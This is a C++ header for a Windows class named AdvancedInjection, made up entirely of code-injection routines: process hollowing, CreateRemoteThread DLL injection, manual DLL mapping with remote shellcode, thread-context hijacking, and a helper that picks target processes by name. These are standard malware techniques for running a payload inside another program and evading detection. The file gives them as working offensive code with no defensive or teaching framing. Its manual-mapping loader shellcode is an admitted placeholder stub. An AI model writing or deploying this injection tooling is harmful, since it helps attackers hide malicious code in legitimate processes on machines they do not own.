#pragma once
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <memory>

// NT API function prototypes
typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* pNtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(WINAPI* pNtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(WINAPI* pNtSetContextThread)(HANDLE, PCONTEXT);
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);

// Reflective DLL loading structures
typedef struct _MANUAL_INJECT {
    PVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseRelocation;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
    pLoadLibraryA fnLoadLibraryA;
    pGetProcAddress fnGetProcAddress;
} MANUAL_INJECT, *PMANUAL_INJECT;

class AdvancedInjection {
private:
    HMODULE hNtdll;
    pNtUnmapViewOfSection NtUnmapViewOfSection;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtReadVirtualMemory NtReadVirtualMemory;
    pNtResumeThread NtResumeThread;
    pNtGetContextThread NtGetContextThread;
    pNtSetContextThread NtSetContextThread;
    
public:
    AdvancedInjection() {
        initializeNTAPI();
    }
    
    // Initialize NT API functions
    bool initializeNTAPI() {
        hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
        NtResumeThread = (pNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
        NtGetContextThread = (pNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
        NtSetContextThread = (pNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
        
        return (NtUnmapViewOfSection && NtWriteVirtualMemory && NtReadVirtualMemory && 
                NtResumeThread && NtGetContextThread && NtSetContextThread);
    }
    
    // Process Hollowing implementation
    bool processHollowing(const std::string& targetPath, const std::vector<BYTE>& payload) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        // Create target process in suspended state
        if (!CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE, 
                           CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return false;
        }
        
        // Get thread context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (NtGetContextThread(pi.hThread, &ctx) != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Read PEB to get image base
        PVOID pebImageBase;
        ULONG bytesRead;
#ifdef _WIN64
        if (NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), 
                               &pebImageBase, sizeof(pebImageBase), &bytesRead) != 0) {
#else
        if (NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x8), 
                               &pebImageBase, sizeof(pebImageBase), &bytesRead) != 0) {
#endif
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Unmap original image
        if (NtUnmapViewOfSection(pi.hProcess, pebImageBase) != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Parse PE headers from payload
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);
        
        // Allocate memory for new image
        PVOID newImageBase = VirtualAllocEx(pi.hProcess, pebImageBase, 
                                           ntHeaders->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!newImageBase) {
            // Try allocating at preferred base address
            newImageBase = VirtualAllocEx(pi.hProcess, (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            
            if (!newImageBase) {
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
        }
        
        // Write PE headers
        ULONG bytesWritten;
        if (NtWriteVirtualMemory(pi.hProcess, newImageBase, (PVOID)payload.data(),
                                ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten) != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Write sections
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                PVOID sectionDest = (PVOID)((DWORD_PTR)newImageBase + sectionHeader[i].VirtualAddress);
                PVOID sectionSrc = (PVOID)(payload.data() + sectionHeader[i].PointerToRawData);
                
                if (NtWriteVirtualMemory(pi.hProcess, sectionDest, sectionSrc,
                                        sectionHeader[i].SizeOfRawData, &bytesWritten) != 0) {
                    TerminateProcess(pi.hProcess, 0);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return false;
                }
            }
        }
        
        // Update PEB with new image base
#ifdef _WIN64
        if (NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                                &newImageBase, sizeof(newImageBase), &bytesWritten) != 0) {
#else
        if (NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x8),
                                &newImageBase, sizeof(newImageBase), &bytesWritten) != 0) {
#endif
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Set new entry point
#ifdef _WIN64
        ctx.Rcx = (DWORD64)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        ctx.Eax = (DWORD)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
        if (NtSetContextThread(pi.hThread, &ctx) != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Resume execution
        if (NtResumeThread(pi.hThread, NULL) != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    
    // DLL Injection using CreateRemoteThread
    bool dllInjection(DWORD processId, const std::string& dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) return false;
        
        // Allocate memory for DLL path
        PVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteDllPath) {
            CloseHandle(hProcess);
            return false;
        }
        
        // Write DLL path to target process
        ULONG bytesWritten;
        if (NtWriteVirtualMemory(hProcess, remoteDllPath, (PVOID)dllPath.c_str(),
                                dllPath.length() + 1, &bytesWritten) != 0) {
            VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Get LoadLibraryA address
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
        
        // Create remote thread
        HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
                                                 (LPTHREAD_START_ROUTINE)loadLibraryAddr,
                                                 remoteDllPath, 0, NULL);
        
        if (!hRemoteThread) {
            VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Wait for thread completion
        WaitForSingleObject(hRemoteThread, INFINITE);
        
        // Cleanup
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hRemoteThread);
        CloseHandle(hProcess);
        
        return true;
    }
    
    // Manual DLL Mapping (Reflective DLL Loading)
    bool manualDllMapping(DWORD processId, const std::vector<BYTE>& dllData) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) return false;
        
        // Parse PE headers
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllData.data();
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            CloseHandle(hProcess);
            return false;
        }
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllData.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            CloseHandle(hProcess);
            return false;
        }
        
        // Allocate memory for DLL
        PVOID remoteImage = VirtualAllocEx(hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteImage) {
            CloseHandle(hProcess);
            return false;
        }
        
        // Write headers
        ULONG bytesWritten;
        if (NtWriteVirtualMemory(hProcess, remoteImage, (PVOID)dllData.data(),
                                ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten) != 0) {
            VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Write sections
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                PVOID sectionDest = (PVOID)((DWORD_PTR)remoteImage + sectionHeader[i].VirtualAddress);
                PVOID sectionSrc = (PVOID)(dllData.data() + sectionHeader[i].PointerToRawData);
                
                if (NtWriteVirtualMemory(hProcess, sectionDest, sectionSrc,
                                        sectionHeader[i].SizeOfRawData, &bytesWritten) != 0) {
                    VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    return false;
                }
            }
        }
        
        // Allocate memory for loader data
        MANUAL_INJECT loaderData;
        loaderData.ImageBase = remoteImage;
        loaderData.NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)remoteImage + dosHeader->e_lfanew);
        loaderData.BaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)remoteImage + 
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        loaderData.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)remoteImage + 
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        loaderData.fnLoadLibraryA = (pLoadLibraryA)GetProcAddress(hKernel32, "LoadLibraryA");
        loaderData.fnGetProcAddress = (pGetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
        
        PVOID remoteLoaderData = VirtualAllocEx(hProcess, NULL, sizeof(MANUAL_INJECT),
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteLoaderData) {
            VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        if (NtWriteVirtualMemory(hProcess, remoteLoaderData, &loaderData,
                                sizeof(MANUAL_INJECT), &bytesWritten) != 0) {
            VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteLoaderData, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Create loader shellcode
        std::vector<BYTE> loaderShellcode = createLoaderShellcode();
        
        PVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, loaderShellcode.size(),
                                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteShellcode) {
            VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteLoaderData, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        if (NtWriteVirtualMemory(hProcess, remoteShellcode, loaderShellcode.data(),
                                loaderShellcode.size(), &bytesWritten) != 0) {
            VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteLoaderData, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Execute loader
        HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
                                                 (LPTHREAD_START_ROUTINE)remoteShellcode,
                                                 remoteLoaderData, 0, NULL);
        
        if (!hRemoteThread) {
            VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteLoaderData, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        WaitForSingleObject(hRemoteThread, INFINITE);
        
        // Cleanup
        VirtualFreeEx(hProcess, remoteLoaderData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hRemoteThread);
        CloseHandle(hProcess);
        
        return true;
    }
    
    // Thread Execution Hijacking
    bool threadHijacking(DWORD processId, const std::vector<BYTE>& shellcode) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);
        
        if (!Thread32First(hSnapshot, &te32)) {
            CloseHandle(hSnapshot);
            return false;
        }
        
        HANDLE hThread = NULL;
        do {
            if (te32.th32OwnerProcessID == processId) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te32));
        
        CloseHandle(hSnapshot);
        
        if (!hThread) return false;
        
        // Suspend thread
        if (SuspendThread(hThread) == -1) {
            CloseHandle(hThread);
            return false;
        }
        
        // Get thread context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(hThread, &ctx)) {
            ResumeThread(hThread);
            CloseHandle(hThread);
            return false;
        }
        
        // Open target process
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) {
            ResumeThread(hThread);
            CloseHandle(hThread);
            return false;
        }
        
        // Allocate memory for shellcode
        PVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, shellcode.size(),
                                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteShellcode) {
            ResumeThread(hThread);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }
        
        // Write shellcode
        ULONG bytesWritten;
        if (NtWriteVirtualMemory(hProcess, remoteShellcode, (PVOID)shellcode.data(),
                                shellcode.size(), &bytesWritten) != 0) {
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            ResumeThread(hThread);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }
        
        // Modify thread context to execute shellcode
#ifdef _WIN64
        ctx.Rip = (DWORD64)remoteShellcode;
#else
        ctx.Eip = (DWORD)remoteShellcode;
#endif
        if (!SetThreadContext(hThread, &ctx)) {
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            ResumeThread(hThread);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }
        
        // Resume thread
        ResumeThread(hThread);
        
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }
    
    // Find suitable target process
    DWORD findTargetProcess(const std::vector<std::string>& preferredTargets) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        std::vector<DWORD> candidates;
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                // Check if process is in preferred targets
                for (const auto& target : preferredTargets) {
                    if (_stricmp(pe32.szExeFile, target.c_str()) == 0) {
                        // Verify process is accessible
                        HANDLE hTest = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                        if (hTest) {
                            CloseHandle(hTest);
                            candidates.push_back(pe32.th32ProcessID);
                        }
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        
        // Return first suitable candidate
        return candidates.empty() ? 0 : candidates[0];
    }
    
private:
    // Create loader shellcode for manual DLL mapping
    std::vector<BYTE> createLoaderShellcode() {
        // This is a simplified version - in practice, you'd need proper shellcode
        // that handles relocations, imports, and calls DllMain
        std::vector<BYTE> shellcode = {
            0x48, 0x89, 0xE5,                   // mov rbp, rsp
            0x48, 0x83, 0xEC, 0x20,             // sub rsp, 32
            0x48, 0x89, 0xCB,                   // mov rbx, rcx (loader data)
            // Add proper loader implementation here
            0x48, 0x83, 0xC4, 0x20,             // add rsp, 32
            0x5D,                               // pop rbp
            0xC3                                // ret
        };
        
        return shellcode;
    }
};